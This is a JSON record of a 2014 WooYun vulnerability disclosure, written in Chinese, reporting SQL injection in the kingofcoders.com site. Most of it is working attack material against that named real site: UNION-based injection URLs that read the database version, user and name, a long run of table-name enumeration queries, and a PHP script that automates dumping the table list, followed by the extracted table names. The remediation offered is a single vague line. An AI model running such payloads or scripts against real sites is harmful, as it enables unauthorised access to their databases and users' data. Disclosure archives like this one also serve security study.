{"id": 56104, "wybug_id": "wooyun-2014-058887", "wybug_title": "编程王过滤不严格导致多处注入", "wybug_corp": "编程王", "wybug_author": "Rain", "wybug_date": "2014-04-29 15:52", "wybug_open_date": "2014-06-13 15:53", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-06-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 过滤不严格导致注入本来是拿来做sqlmap的学习例子的，但是不知道为什么，sqlmap测试不出来结果没办法，后来还是手动测试了 详细说明：  过滤不严格导致注入sqlmap直接-u测试不出来，真是奇怪   漏洞证明：  手动注入测试判断字段个数http://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 order by 13--测试unionhttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13-- 查看数据库、版本、用户信息http://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,version(),user(),database(),10,11,12,13-- 得到下面信息KingOfCoder@localhost5.5.34-0ubuntu0.13.04.1-log数据库名称KingOfCoder 获取表名http://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 0,1-- 表名：MysqlSpacehttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 1,1-- 表名：alexaHistoryhttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 2,1-- 表名：allProgrammingWebhttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 3,1-- 表名：allProgrammingWebRankinghttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 4,1-- 表名：articleshttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 5,1-- 表名：commentenglish_newshttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 6,1-- 表名：commentenglish_newsCpphttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 7,1-- 表名：commentenglish_newsDotNethttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 8,1-- 表名：commentenglish_newsJavahttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 9,1-- 表名：commentenglish_newsLinuxhttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 10,1-- 表名：commentenglish_newsPhphttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 11,1-- 表名：commentnewshttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 12,1-- 表名：commentnewsApplicationhttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 13,1-- 表名：commentnewsAssemblyhttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 14,1-- 表名：commentnewsBSDhttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 15,1-- 表名：commentnewsBorlandhttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 16,1-- 表名：commentnewsCpphttp://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 17,1-- 表名：commentnewsDB2http://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288 and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit 18,1-- 表名：commentnewsDatabase太多表了，后续直接写一个php，测试后续的表名称\n<?phpfor ($i = 19; $i < 100; $i++){\t$url = 'http://www.kingofcoders.com/viewNews.php?type=newsJava&id=2288'.urlencode(' and 3=2 union select 1,2,3,4,5,6,7,table_name,9,10,11,12,13 from information_schema.tables where table_schema=database() limit '.$i.',1-- ');\t$ret = file_get_contents($url);\t$ret = str_replace(\"\\r\", '', $ret);\t$ret = str_replace(\"\\n\", '', $ret);\tpreg_match('/newsHeader\">(.*?)<\\/span>/i', $ret, $match);\tif (isset($match[1]))\t{\t\techo 'find table: ',$match[1],PHP_EOL;\t\tfile_put_contents('result.txt', $match[1].\"\\n\", FILE_APPEND);\t}\telse\t{\t\techo 'run finish',PHP_EOL;\t\tbreak;\t}}?>\ncommentnewsDotNetcommentnewsEmbeddedDBcommentnewsITCertcommentnewsJavacommentnewsJobscommentnewsLinuxcommentnewsMicrosoftcommentnewsMysqlcommentnewsOpenSourcecommentnewsOraclecommentnewsPerl_PythoncommentnewsPhpcommentnewsPostgreSQLcommentnewsProgrammingcommentnewsRubycommentnewsSQLServercommentnewsSolariscommentnewsStoragecommentnewsTalkingcommentnewsVB6commentnewsVC6english_newsenglish_newsCppenglish_newsDotNetenglish_newsDotNetToolsenglish_newsJavaenglish_newsLinuxenglish_newsPhpgroupsUserjobskeywordkeyword_badlibraryBookloginHistorynewsnewsApplicationnewsAssemblynewsBSDnewsBorlandnewsCppnewsDB2newsDatabasenewsDotNetnewsEmbeddedDBnewsITCertnewsJavanewsJobsnewsLinuxnewsMicrosoftnewsMysqlnewsNetworknewsOpenSourcenewsOraclenewsPerl_PythonnewsPhpnewsPostgreSQLnewsProgrammingnewsRubynewsSQLServernewsSolarisnewsStoragenewsTalkingnewsVB6newsVC6newsWindowsscoresearchCodeHistorysyncNewsuseruser_settingviewArticleHistoryviewNewsHistory   修复方案：  过滤严格一下   版权声明：转载请注明来源 Rain@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}